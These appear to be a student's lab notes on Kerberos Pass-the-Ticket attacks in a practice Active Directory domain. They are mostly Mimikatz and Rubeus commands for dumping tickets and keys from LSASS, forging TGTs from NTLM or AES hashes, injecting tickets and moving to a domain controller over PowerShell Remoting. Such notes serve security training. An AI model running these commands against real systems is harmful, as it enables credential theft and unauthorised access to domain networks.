Kerberos
- Ticket Granting Ticket (TGT) is the first ticket obtained on Kerberos, permitting client to obtain additional Kerberos tickets/TGS
- Ticket Granting Service (TGS) requested by users who want to use a service

We need valid Kerberos ticket to do PtT attack.
- Can be TGT or TGS

# Getting a ticket
Scenario:
- Access to target and have gotten admin privileges, working with local admin rights
- Want to get access tickets/create new tickets

## Harvesting tickets from system from Windows
- Tickets processed and stored by LSAS
- To get ticket, must communicate with LSASS and request it
	- Local admin can get everything, non-admin only your ticket

Mimikatz
- `mimikatz.exe`
- `privilege::debug`
- `sekurlsa::tickets /export`
- Tickets will be saved as files with extension `.kirbi`
- Tickets that end with $ correspond to the computer acccount, which needs ticket to interact with the AD
- User tickets have user'sname followed by @ that separates service namd and domain
	- `[randomvalue]-username@service-domain.local.kirbi`

Rubeus
- `Rubeus.exe dump /nowrap`
- Prints tickets encoded in Base64 insteaded of giving a file

## Pass the Key / OverPass the Hash (forging a ticket)
- Converts a hash/key for a domain-joined user into a full TGT

1. Dump all Kerberos encryption keys
	- `mimikatz.exe`
	- `privilege::debug`
	- `sekurlsa:ekeys`
		- Collect the RC4_HMAC and AES256_HMAC keys
		- The RC4 ones are the NTLM hashes for associated user, AES is the AES key for Kerberos ticket specifically
2. Impersonate that user with mimikatz (we saw this in [[8. Pass the Hash]])
	- `mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f`
		- Assuming `plaintext` is user and `3f..` is the hash found
3. As that user, forge a ticket with Rubeus
	- `Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap`
		- Use the aes key from before here
		- Can actually also use /rc4 or /aes128 or /aes256 keys here
	- Will output the ticket in base64

# Passing The Ticket
Now that we have some Kerberos tickets, can use them

Mimikatz
- `mimikatz.exe`
- `privilege::debug`
- `ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"`

Rubeus
- Instead of step 3 from above, add int the `/ptt` flag to submit the ticket (TGT or TGS) to current logon session
	- `Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt`
		- Should say Ticket Successfully imported!
- Or, import into current session using `.kirbi` file form the disk
	- eg. Got a key with Mimikatz, saved under ....kirbi
	- `Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi`
- Can also pass as base64 format
	- `Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/...SNIP...
	- Can convert `.kirbi` to Base64
		- `[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))`


# Passing The Ticket (PowerShell Remoting)
- Idea is that if the user has (the below requirements), can authenticate him on OTHER machines (not just this one)
	- Regulat PtT on a single box = inject ticket -> use local/nearby services
	- PtT + PowerShell Remoting = inject ticket -> kerberos to WinRM on another omputer
- Requirements:
	- Admin permissions
	- or Member of Remote Management Users Group
	- or have explicit PowerShell Remoting permissions in session config
- Case: user account doesn't have admin privileges on a remote computer but is a member of **Remote Management Users group**
	- Can use Powershell Remoting to connect to that computer and execcute commands
	- eg. Have compromised Win01, and want to remote into DC01, which is a WinRM server
		- Within Win01, do Pass The Ticket, to get a valid TGT, gets TGS, then presents it to DC01 to login as john on DC01
	
Mimikatz
- `mimikatz.exe`
- `privilege::debug`
- `ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"`
- `exit`
- Then connect to the target machine as john
- `powershell`
- `Enter-PSSession -ComputerName DC01`


Rubeus
- `Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show`
- `Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt`
- Then connect to target machine as john
- `powershell
- `Enter-PSSession -ComputerName DC01`